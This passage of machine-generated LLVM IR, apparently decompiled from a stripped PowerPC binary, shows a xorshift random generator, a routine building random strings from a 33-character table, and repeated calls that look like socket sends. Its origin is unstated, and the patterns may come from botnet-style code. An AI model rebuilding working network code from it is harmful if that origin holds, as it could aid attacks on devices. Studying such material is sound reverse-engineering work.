  %v4_100061e8 = call i32 @function_10008a80(i32 %v3_100061dc, i32 %v2_10005bbc, i32 2, i32 16384)
  br label %dec_label_pc_10005f6c

dec_label_pc_100061f0:                            ; preds = %dec_label_pc_1000616c
  store i32 268460536, i32* @lr, align 4
  %v2_100061f4 = call i32 @function_100074dc(i8* %v1_100061f4)
  %v3_100061f4 = trunc i32 %v2_100061f4 to i16
  store i16 %v3_100061f4, i16* %stack_var_-1656, align 2
  store i32 268460544, i32* @lr, align 4
  %v2_100061fc = call i32 @function_100077e0(i32 %v2_100061f4)
  store i32 %v2_100061fc, i32* @global_var_1001b288.63, align 4
  %v3_10006208 = load i32, i32* @global_var_1001b26c.138, align 4
  store i32 4, i32* %r5.global-to-local, align 4
  store i32 268460568, i32* @lr, align 4
  %v4_10006214 = call i32 @function_10008a80(i32 %v3_10006208, i32 ptrtoint (i32* @global_var_1000a84c.144 to i32), i32 4, i32 16384)
  %v3_10006218 = load i32, i32* @global_var_1001b26c.138, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  store i32 268460588, i32* @lr, align 4
  %v4_10006228 = call i32 @function_10008a80(i32 %v3_10006218, i32 %v2_10005bbc, i32 1, i32 16384)
  %v3_1000622c = load i16, i16* %stack_var_-1656, align 2
  %v4_1000622c = sext i16 %v3_1000622c to i32
  store i32 %v4_1000622c, i32* %r5.global-to-local, align 4
  %v3_10006230 = icmp eq i16 %v3_1000622c, 0
  br i1 %v3_10006230, label %dec_label_pc_10005e50.backedge, label %dec_label_pc_10006238

dec_label_pc_10006238:                            ; preds = %dec_label_pc_100061f0
  %v3_10006238 = load i32, i32* @global_var_1001b26c.138, align 4
  store i32 268460616, i32* @lr, align 4
  %v4_10006244 = call i32 @function_10008a80(i32 %v3_10006238, i32 %v2_10005c94, i32 %v4_1000622c, i32 16384)
  br label %dec_label_pc_10005e50.backedge

dec_label_pc_1000624c:                            ; preds = %dec_label_pc_1000608c, %dec_label_pc_10006044
  %v0_1000624c = load i32, i32* @r31, align 4
  %v1_1000624c = inttoptr i32 %v0_1000624c to i32*
  %v2_1000624c = load i32, i32* %v1_1000624c, align 4
  %v3_10006250 = icmp eq i32 %v2_1000624c, 11
  br i1 %v3_10006250, label %dec_label_pc_10005e50.backedge, label %dec_label_pc_10006258

dec_label_pc_10006258:                            ; preds = %dec_label_pc_1000624c
  %v3_10006258 = icmp eq i32 %v2_1000624c, 4
  br i1 %v3_10006258, label %dec_label_pc_10005e50.backedge, label %dec_label_pc_100060b4

dec_label_pc_10006264:                            ; preds = %dec_label_pc_10006074
  %v3_10006264 = load i32, i32* @global_var_1001b26c.138, align 4
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 268460664, i32* @lr, align 4
  %v4_10006274 = call i32 @function_10008a08(i32 %v3_10006264, i32 %v2_10005bbc, i32 2, i32 16384)
  br label %dec_label_pc_10005e50.backedge

dec_label_pc_1000627c:                            ; preds = %dec_label_pc_10006084
  store i32 268460676, i32* @lr, align 4
  %v0_10006280 = call i32 @function_10007d68()
  %v3_10006284 = load i16, i16* %stack_var_-1656, align 2
  %v4_10006284 = sext i16 %v3_10006284 to i32
  store i32 %v4_10006284, i32* %r5.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @global_var_1001b26c.138, align 4
  br label %dec_label_pc_1000608c

dec_label_pc_10006294:                            ; preds = %dec_label_pc_100060ac
  %v3_10006294 = load i32, i32* @global_var_1001b26c.138, align 4
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 268460712, i32* @lr, align 4
  %v4_100062a4 = call i32 @function_10008a08(i32 %v3_10006294, i32 %v2_10005bbc, i32 2, i32 16384)
  %v3_100062a8 = load i32, i32* @global_var_1001b26c.138, align 4
  %v3_100062ac = load i16, i16* %stack_var_-1656, align 2
  %v4_100062ac = sext i16 %v3_100062ac to i32
  store i32 %v4_100062ac, i32* %r5.global-to-local, align 4
  store i32 268460732, i32* @lr, align 4
  %v4_100062b8 = call i32 @function_10008a08(i32 %v3_100062a8, i32 %v2_10006094, i32 %v4_100062ac, i32 16384)
  %v3_100062bc = load i16, i16* %stack_var_-1656, align 2
  %v3_100062c0 = icmp eq i16 %v3_100062bc, 0
  br i1 %v3_100062c0, label %dec_label_pc_10005e50.backedge, label %dec_label_pc_100062c8

dec_label_pc_100062c8:                            ; preds = %dec_label_pc_10006294
  %v4_100062bc = sext i16 %v3_100062bc to i32
  store i32 268460752, i32* @lr, align 4
  %v2_100062cc = call i32 @function_10001eac(i32 %v2_10006094, i32 %v4_100062bc)
  br label %dec_label_pc_10005e50.backedge

dec_label_pc_100062d4:                            ; preds = %dec_label_pc_10005c94
  %v0_100062d4 = load i32, i32* @r24, align 4
  %v1_100062d4 = add i32 %v0_100062d4, 4
  %v2_100062d4 = inttoptr i32 %v1_100062d4 to i32*
  %v3_100062d4 = load i32, i32* %v2_100062d4, align 4
  store i32 268460764, i32* @lr, align 4
  %v1_100062d8 = inttoptr i32 %v3_100062d4 to i8*
  %v2_100062d8 = call i32 @function_100074dc(i8* %v1_100062d8)
  %v2_100062dc = icmp sgt i32 %v2_100062d8, 31
  br i1 %v2_100062dc, label %dec_label_pc_10005cb4, label %dec_label_pc_100062e4

dec_label_pc_100062e4:                            ; preds = %dec_label_pc_100062d4
  %v0_100062e4 = load i32, i32* @r24, align 4
  %v1_100062e4 = add i32 %v0_100062e4, 4
  %v2_100062e4 = inttoptr i32 %v1_100062e4 to i32*
  %v3_100062e4 = load i32, i32* %v2_100062e4, align 4
  store i32 %v2_10005c94, i32* @r3, align 4
  %v2_100062ec = bitcast i32* %stack_var_-1586 to i8*
  %v3_100062ec = call i32 @function_10007504(i8* %v2_100062ec, i32 %v3_100062e4)
  %v0_100062f0 = load i32, i32* @r24, align 4
  %v1_100062f0 = add i32 %v0_100062f0, 4
  %v2_100062f0 = inttoptr i32 %v1_100062f0 to i32*
  %v3_100062f0 = load i32, i32* %v2_100062f0, align 4
  store i32 %v3_100062f0, i32* %r29.global-to-local, align 4
  store i32 268460796, i32* @lr, align 4
  %v1_100062f8 = inttoptr i32 %v3_100062f0 to i8*
  %v2_100062f8 = call i32 @function_100074dc(i8* %v1_100062f8)
  store i32 %v2_100062f8, i32* @r4, align 4
  store i32 %v3_100062f0, i32* @r3, align 4
  store i32 268460808, i32* @lr, align 4
  %v0_10006304 = call i32 @function_10007584()
  br label %dec_label_pc_10005cb4

dec_label_pc_1000630c:                            ; preds = %dec_label_pc_10005c34
  store i32 268460820, i32* @lr, align 4
  %v1_10006310 = call i32 @function_10008b68(i32 5)
  br label %dec_label_pc_10005c94

; uselistorder directives
  uselistorder i16 %v3_100062bc, { 1, 0 }
  uselistorder i32 %v3_100060e8, { 1, 0, 2 }
  uselistorder i32 %v1_10006090, { 1, 0 }
  uselistorder i32 %v1_10006078, { 2, 1, 0 }
  uselistorder i32 %v1_1000603c, { 1, 0 }
  uselistorder i32 %v3_10006018, { 0, 2, 5, 3, 1, 4 }
  uselistorder i32 %v1_10005f8c, { 2, 1, 0 }
  uselistorder i32 %v2_10005f54, { 1, 0, 2 }
  uselistorder i32 %v0_10005f44, { 2, 0, 1 }
  uselistorder i32 %v2_10006000, { 1, 0, 2 }
  uselistorder i32 %v1_10005ea0, { 1, 0 }
  uselistorder i32 %v1_10005e84, { 1, 0 }
  uselistorder i32 %v1_10005e80, { 1, 0 }
  uselistorder i32 %v1_10005e68, { 1, 0 }
  uselistorder i32 %v1_10005e64, { 1, 0 }
  uselistorder i32 %v2_10006094, { 1, 2, 0 }
  uselistorder i32 %v2_10005e2c, { 1, 0, 2 }
  uselistorder i32 %v2_10005e24, { 0, 2, 1 }
  uselistorder i32 %v3_10005dec, { 1, 2, 0 }
  uselistorder i32 %v1_10005d10, { 1, 0 }
  uselistorder i32 %v1_10005cc4, { 1, 0 }
  uselistorder i32 %v2_10005c94, { 1, 0, 2 }
  uselistorder i32 %v1_10005c14, { 1, 0 }
  uselistorder i32 %v0_10005c04, { 0, 2, 1 }
  uselistorder i32 %v2_10005bd0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10005bbc, { 4, 5, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_10005bb4, { 2, 1, 0 }
  uselistorder i32 %v1_10005bac, { 1, 0 }
  uselistorder i32 %v0_10005ba8, { 1, 0 }
  uselistorder i32 %v2_10005a34, { 1, 3, 2, 0, 4 }
  uselistorder i32* %stack_var_-1648, { 0, 1, 2, 4, 3, 5 }
  uselistorder i16* %stack_var_-1656, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-1652, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 33, 34, 16, 17, 18, 31, 32, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 11, 12, 13, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %ctr.global-to-local, { 0, 1, 12, 13, 2, 3, 4, 10, 11, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1000899c, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10008a08, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 172, { 2, 3, 4, 5, 0, 1 }
  uselistorder i8* @global_var_1001b2a0.139, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_1001b26c.138, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19 }
  uselistorder i32 ()* @function_10007db0, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_10006bd8, { 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_100081c8, { 1, 0 }
  uselistorder i32 (i32)* @function_10006c64, { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @function_10007504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 56, 57, 58, 59, 60, 61, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 ()* @function_10005780, { 1, 0 }
  uselistorder i32 (i32)* @function_100077e0, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000a7bc.8 to i32), { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @function_10008c10, { 1, 0 }
  uselistorder i32* @r24, { 1, 2, 3, 4, 5, 6, 7, 0, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %dec_label_pc_10006138, { 1, 0 }
  uselistorder label %dec_label_pc_100060c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000608c, { 1, 0 }
  uselistorder label %dec_label_pc_10005e50.backedge, { 5, 11, 4, 12, 10, 3, 9, 2, 1, 8, 7, 0, 6 }
  uselistorder label %dec_label_pc_10005fdc, { 1, 0 }
  uselistorder label %dec_label_pc_10005f94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005f6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005f08, { 1, 0 }
  uselistorder label %dec_label_pc_10005ec4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005eb4, { 1, 0 }
  uselistorder label %dec_label_pc_10005e7c.dec_label_pc_10005e7c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10005e60.dec_label_pc_10005e60_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10005cb4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005c94, { 2, 0, 1 }
}

define i32 @function_10006318() local_unnamed_addr {
dec_label_pc_10006318:
  %v3_10006320 = load i32, i32* @global_var_1001b300.145, align 4
  %v3_10006328 = load i32, i32* @global_var_1001b2f4.146, align 4
  %v1_10006330 = udiv i32 %v3_10006320, 524288
  %v3_10006334 = load i32, i32* @global_var_1001b2fc.147, align 4
  %v1_10006338 = mul i32 %v3_10006328, 2048
  %v2_1000633c = xor i32 %v1_10006330, %v3_10006320
  %v2_10006340 = xor i32 %v1_10006338, %v3_10006328
  %v3_10006344 = load i32, i32* @global_var_1001b2f8.148, align 4
  %v2_10006348 = xor i32 %v2_1000633c, %v2_10006340
  %v1_1000634c = udiv i32 %v2_10006340, 256
  %v2_10006350 = xor i32 %v2_10006348, %v1_1000634c
  store i32 %v3_10006344, i32* @global_var_1001b2f4.146, align 4
  store i32 %v3_10006334, i32* @global_var_1001b2f8.148, align 4
  store i32 %v3_10006320, i32* @global_var_1001b2fc.147, align 4
  store i32 %v2_10006350, i32* @global_var_1001b300.145, align 4
  ret i32 %v2_10006350

; uselistorder directives
  uselistorder i32 %v2_10006350, { 1, 0 }
  uselistorder i32 %v3_10006328, { 1, 0 }
  uselistorder i32 %v3_10006320, { 2, 1, 0 }
}

define i32 @function_10006368(i32 %arg1) local_unnamed_addr {
dec_label_pc_10006368:
  store i32 268460936, i32* @lr, align 4
  %v0_10006384 = call i32 @function_10008138()
  store i32 %v0_10006384, i32* @global_var_1001b2f4.146, align 4
  store i32 268460948, i32* @lr, align 4
  %v0_10006390 = call i32 @function_10007df8()
  store i32 268460956, i32* @lr, align 4
  %v0_10006398 = call i32 @function_10007e40()
  %v2_1000639c = xor i32 %v0_10006390, %v0_10006398
  store i32 %v2_1000639c, i32* @global_var_1001b2f8.148, align 4
  store i32 268460968, i32* @lr, align 4
  %v1_100063a4 = call i32 @function_10008490(i32 %v0_10006398)
  %v3_100063a8 = load i32, i32* @global_var_1001b2f8.148, align 4
  %v2_100063b8 = xor i32 %v3_100063a8, %v1_100063a4
  store i32 %v2_100063b8, i32* @global_var_1001b300.145, align 4
  store i32 %v1_100063a4, i32* @global_var_1001b2fc.147, align 4
  ret i32 %v1_100063a4

; uselistorder directives
  uselistorder i32 %v1_100063a4, { 2, 1, 0 }
  uselistorder i32 %v0_10006398, { 1, 0 }
  uselistorder i32 ()* @function_10007e40, { 2, 1, 0 }
  uselistorder i32 ()* @function_10008138, { 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
}

define i32 @function_100063d8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100063d8:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_gt.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 33, i32* @r5, align 4
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_1000a88c.149 to i32), i32* @r4, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v2_100063fc = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_100063fc, i32* @r3, align 4
  store i32 268461088, i32* @lr, align 4
  %v0_1000641c = call i32 @function_100084c8()
  store i32 %v0_1000641c, i32* %r3.global-to-local, align 4
  %v0_10006420 = load i32, i32* %r30.global-to-local, align 4
  %v1_10006420 = icmp slt i32 %v0_10006420, 0
  %v2_10006420 = icmp sgt i32 %v0_10006420, 0
  %v3_10006420 = icmp eq i32 %v0_10006420, 0
  store i1 %v1_10006420, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10006420, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10006420, i1* %cr7_eq.global-to-local, align 1
  %tmp20 = icmp slt i32 %v0_10006420, 1
  br i1 %tmp20, label %dec_label_pc_10006514, label %dec_label_pc_10006428

dec_label_pc_10006428:                            ; preds = %dec_label_pc_100063d8
  %v3_1000643c = load i32, i32* @global_var_1001b300.145, align 4
  store i32 %v3_1000643c, i32* %r4.global-to-local, align 4
  %v3_10006440 = load i32, i32* @global_var_1001b2fc.147, align 4
  store i32 %v3_10006440, i32* %r29.global-to-local, align 4
  store i32 1041204193, i32* %r28.global-to-local, align 4
  %v3_10006448 = load i32, i32* @global_var_1001b2f8.148, align 4
  store i32 %v3_10006448, i32* %r12.global-to-local, align 4
  %v3_1000644c = load i32, i32* @global_var_1001b2f4.146, align 4
  store i32 %v3_1000644c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100064b4

dec_label_pc_10006454:                            ; preds = %dec_label_pc_100064b4
  %v2_10006454 = call i32 @__asm_rlwinm(i32 %v2_100064d4, i32 29, i32 27, i32 31)
  %v2_10006458 = call i32 @__asm_rlwinm(i32 %v2_100064d4, i32 21, i32 27, i32 31)
  store i32 %v2_10006458, i32* %r9.global-to-local, align 4
  %v0_1000645c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000645c = add i32 %v0_1000645c, -4
  store i32 %v1_1000645c, i32* %r30.global-to-local, align 4
  %v0_10006460 = load i32, i32* @r1, align 4
  %v2_10006460 = add i32 %v0_10006460, %v2_10006454
  store i32 %v2_10006460, i32* %r11.global-to-local, align 4
  %v2_10006464 = add i32 %v0_10006460, %v2_10006458
  store i32 %v2_10006464, i32* %r6.global-to-local, align 4
  %v2_10006468 = call i32 @__asm_rlwinm(i32 %v2_100064d4, i32 13, i32 27, i32 31)
  %v2_1000646c = udiv i32 %v2_100064cc, 134217728
  store i32 %v2_1000646c, i32* %r9.global-to-local, align 4
  %v0_10006470 = load i32, i32* %r30.global-to-local, align 4
  %v1_10006470 = icmp slt i32 %v0_10006470, 0
  %v2_10006470 = icmp sgt i32 %v0_10006470, 0
  %v3_10006470 = icmp eq i32 %v0_10006470, 0
  store i1 %v1_10006470, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10006470, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10006470, i1* %cr7_eq.global-to-local, align 1
  %v0_10006474 = load i32, i32* @r1, align 4
  %v2_10006474 = add i32 %v0_10006474, %v2_10006468
  store i32 %v2_10006474, i32* %r10.global-to-local, align 4
  %v2_10006478 = add i32 %v0_10006474, %v2_1000646c
  %v0_1000647c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000647c = add i32 %v0_1000647c, 8
  %v2_1000647c = inttoptr i32 %v1_1000647c to i8*
  %v3_1000647c = load i8, i8* %v2_1000647c, align 1
  %v1_10006480 = add i32 %v2_10006474, 8
  %v2_10006480 = inttoptr i32 %v1_10006480 to i8*
  %v3_10006480 = load i8, i8* %v2_10006480, align 1
  %v4_10006480 = zext i8 %v3_10006480 to i32
  store i32 %v4_10006480, i32* %r7.global-to-local, align 4
  %v0_10006484 = load i32, i32* %r12.global-to-local, align 4
  store i32 %v0_10006484, i32* %r10.global-to-local, align 4
  %v0_10006488 = load i32, i32* %r6.global-to-local, align 4
  %v1_10006488 = add i32 %v0_10006488, 8
  %v2_10006488 = inttoptr i32 %v1_10006488 to i8*
  %v3_10006488 = load i8, i8* %v2_10006488, align 1
  %v4_10006488 = zext i8 %v3_10006488 to i32
  store i32 %v4_10006488, i32* %r9.global-to-local, align 4
  %v1_1000648c = add i32 %v2_10006478, 8
  %v2_1000648c = inttoptr i32 %v1_1000648c to i8*
  %v3_1000648c = load i8, i8* %v2_1000648c, align 1
  %v4_1000648c = zext i8 %v3_1000648c to i32
  store i32 %v4_1000648c, i32* %r11.global-to-local, align 4
  %v2_10006490 = load i32, i32* %r31.global-to-local, align 4
  %v3_10006490 = inttoptr i32 %v2_10006490 to i8*
  store i8 %v3_1000647c, i8* %v3_10006490, align 1
  %v0_10006494 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006494 = trunc i32 %v0_10006494 to i8
  %v2_10006494 = load i32, i32* %r31.global-to-local, align 4
  %v3_10006494 = add i32 %v2_10006494, 1
  %v4_10006494 = inttoptr i32 %v3_10006494 to i8*
  store i8 %v1_10006494, i8* %v4_10006494, align 1
  %v0_10006498 = load i32, i32* %r31.global-to-local, align 4
  %v1_10006498 = add i32 %v0_10006498, 4
  store i32 %v1_10006498, i32* %r31.global-to-local, align 4
  %v0_1000649c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000649c = trunc i32 %v0_1000649c to i8
  %v2_1000649c = load i32, i32* %r3.global-to-local, align 4
  %v3_1000649c = add i32 %v2_1000649c, 2
  %v4_1000649c = inttoptr i32 %v3_1000649c to i8*
  store i8 %v1_1000649c, i8* %v4_1000649c, align 1
  %v0_100064a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_100064a0 = trunc i32 %v0_100064a0 to i8
  %v2_100064a0 = load i32, i32* %r3.global-to-local, align 4
  %v3_100064a0 = add i32 %v2_100064a0, 1
  %v4_100064a0 = inttoptr i32 %v3_100064a0 to i8*
  store i8 %v1_100064a0, i8* %v4_100064a0, align 1
  %v0_100064a4 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_100064a4 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_100064a4 = or i1 %v0_100064a4, %v1_100064a4
  br i1 %v2_100064a4, label %dec_label_pc_10006504, label %dec_label_pc_100064a8

dec_label_pc_100064a8:                            ; preds = %dec_label_pc_100064dc, %dec_label_pc_10006454
  %v0_100064a8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100064a8, i32* %r12.global-to-local, align 4
  %v0_100064ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_100064ac, i32* %r29.global-to-local, align 4
  store i32 %v2_100064d4, i32* %r4.global-to-local, align 4
  %v0_100064b4.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_100064b8.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100064b4

dec_label_pc_100064b4:                            ; preds = %dec_label_pc_10006428, %dec_label_pc_100064a8
  %v0_100064e8 = phi i32 [ %v3_10006448, %dec_label_pc_10006428 ], [ %v0_100064a8, %dec_label_pc_100064a8 ]
  %v0_100064bc = phi i32 [ %v3_1000643c, %dec_label_pc_10006428 ], [ %v2_100064d4, %dec_label_pc_100064a8 ]
  %v0_100064b8 = phi i32 [ %v3_1000644c, %dec_label_pc_10006428 ], [ %v0_100064b8.pre, %dec_label_pc_100064a8 ]
  %v0_100064e0 = phi i32 [ %v0_10006420, %dec_label_pc_10006428 ], [ %v0_100064b4.pre, %dec_label_pc_100064a8 ]
  %v1_100064b4 = icmp ult i32 %v0_100064e0, 3
  %v2_100064b4 = icmp ugt i32 %v0_100064e0, 3
  %v3_100064b4 = icmp eq i32 %v0_100064e0, 3
  store i1 %v1_100064b4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100064b4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100064b4, i1* %cr7_eq.global-to-local, align 1
  %v1_100064b8 = mul i32 %v0_100064b8, 2048
  %v1_100064bc = udiv i32 %v0_100064bc, 524288
  %v2_100064c0 = xor i32 %v1_100064b8, %v0_100064b8
  %v2_100064c4 = xor i32 %v1_100064bc, %v0_100064bc
  %v0_100064c8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100064c8 = add i32 %v0_100064c8, 1
  store i32 %v1_100064c8, i32* %r3.global-to-local, align 4
  %v2_100064cc = xor i32 %v2_100064c4, %v2_100064c0
  %v1_100064d0 = udiv i32 %v2_100064c0, 256
  store i32 %v1_100064d0, i32* %r9.global-to-local, align 4
  %v2_100064d4 = xor i32 %v1_100064d0, %v2_100064cc
  br i1 %v2_100064b4, label %dec_label_pc_10006454, label %dec_label_pc_100064dc

dec_label_pc_100064dc:                            ; preds = %dec_label_pc_100064b4
  %v3_100064d4 = sext i32 %v2_100064d4 to i64
  %v2_100064dc = load i32, i32* %r28.global-to-local, align 4
  %v4_100064dc = zext i32 %v2_100064dc to i64
  %v5_100064dc = mul nuw nsw i64 %v4_100064dc, %v3_100064d4
  %v1_100064e0 = add i32 %v0_100064e0, -1
  store i32 %v1_100064e0, i32* %r30.global-to-local, align 4
  %v1_100064e4 = icmp slt i32 %v1_100064e0, 0
  %v2_100064e4 = icmp sgt i32 %v1_100064e0, 0
  %v3_100064e4 = icmp eq i32 %v1_100064e0, 0
  store i1 %v1_100064e4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100064e4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100064e4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_100064e8, i32* %r10.global-to-local, align 4
  %v1_100064ec6 = udiv i64 %v5_100064dc, 34359738368
  %v1_100064ec = trunc i64 %v1_100064ec6 to i32
  %tmp21 = mul i32 %v1_100064ec, -33
  %v3_100064f4 = add i32 %tmp21, %v2_100064d4
  %v1_100064f8 = trunc i32 %v3_100064f4 to i8
  %v3_100064f8 = inttoptr i32 %v0_100064c8 to i8*
  store i8 %v1_100064f8, i8* %v3_100064f8, align 1
  %v0_100064fc = load i32, i32* %r31.global-to-local, align 4
  %v1_100064fc = add i32 %v0_100064fc, 1
  store i32 %v1_100064fc, i32* %r31.global-to-local, align 4
  %v0_10006500 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_10006500, label %dec_label_pc_100064a8, label %dec_label_pc_10006504

dec_label_pc_10006504:                            ; preds = %dec_label_pc_100064dc, %dec_label_pc_10006454
  store i32 %v2_100064d4, i32* @global_var_1001b300.145, align 4
  %v0_10006508 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10006508, i32* @global_var_1001b2fc.147, align 4
  %v0_1000650c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000650c, i32* @global_var_1001b2f8.148, align 4
  %v0_10006510 = load i32, i32* %r12.global-to-local, align 4
  store i32 %v0_10006510, i32* @global_var_1001b2f4.146, align 4
  %v0_10006540.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006514

dec_label_pc_10006514:                            ; preds = %dec_label_pc_100063d8, %dec_label_pc_10006504
  %v0_10006540 = phi i32 [ %v0_1000641c, %dec_label_pc_100063d8 ], [ %v0_10006540.pre, %dec_label_pc_10006504 ]
  ret i32 %v0_10006540

; uselistorder directives
  uselistorder i32 %v1_100064e0, { 2, 1, 0, 3 }
  uselistorder i32 %v2_100064d4, { 0, 1, 7, 5, 4, 3, 6, 2 }
  uselistorder i32 %v1_100064d0, { 1, 0 }
  uselistorder i32 %v2_100064cc, { 1, 0 }
  uselistorder i32 %v0_100064e0, { 0, 3, 2, 1 }
  uselistorder i32 %v0_100064b8, { 1, 0 }
  uselistorder i32 %v0_100064bc, { 1, 0 }
  uselistorder i32 %v2_1000646c, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 6, 1, 3, 4, 5, 7 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 1, 2, 5, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r12.global-to-local, { 1, 0, 2, 3 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i1* %cr7_gt.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10006514, { 1, 0 }
  uselistorder label %dec_label_pc_100064b4, { 1, 0 }
}

define i32 @function_10006544() local_unnamed_addr {
dec_label_pc_10006544:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %v0_10006544 = load i32, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_10006544, 1
  br i1 %tmp19, label %dec_label_pc_10006544.dec_label_pc_100065f8_crit_edge, label %dec_label_pc_1000655c

dec_label_pc_10006544.dec_label_pc_100065f8_crit_edge: ; preds = %dec_label_pc_10006544
  %v0_10006608.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100065f8

dec_label_pc_1000655c:                            ; preds = %dec_label_pc_10006544
  %v3_1000656c = load i32, i32* @global_var_1001b300.145, align 4
  store i32 %v3_1000656c, i32* %r7.global-to-local, align 4
  %v3_10006570 = load i32, i32* @global_var_1001b2fc.147, align 4
  store i32 %v3_10006570, i32* %r5.global-to-local, align 4
  %v3_10006574 = load i32, i32* @global_var_1001b2f8.148, align 4
  store i32 %v3_10006574, i32* %r6.global-to-local, align 4
  %v3_10006578 = load i32, i32* @global_var_1001b2f4.146, align 4
  br label %dec_label_pc_100065a4

dec_label_pc_10006580:                            ; preds = %dec_label_pc_100065a4
  %v1_10006580 = load i32, i32* @r3, align 4
  %v2_10006580 = inttoptr i32 %v1_10006580 to i32*
